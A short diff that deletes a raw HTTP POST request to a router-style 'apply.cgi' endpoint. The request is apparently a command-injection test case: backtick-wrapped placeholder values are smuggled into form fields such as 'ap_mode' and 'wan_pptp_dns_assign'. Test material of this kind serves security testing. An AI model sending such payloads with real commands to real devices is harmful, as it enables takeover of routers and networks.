@@ -1,6 +1,0 @@
-POST /apply.cgi?USB_disk_rm.htm?dev_name=wan_status HTTP/1.1
-Content-Type: application/json
-Host: 0.0.0.0
-Content-Length: 101
-
-ap_mode=;`wzq`&wan_proto=l2tp&wan_pptp_dns_assign=\r\n`wzq`&submit_flag=block_sites&%20timestamp=l2tp
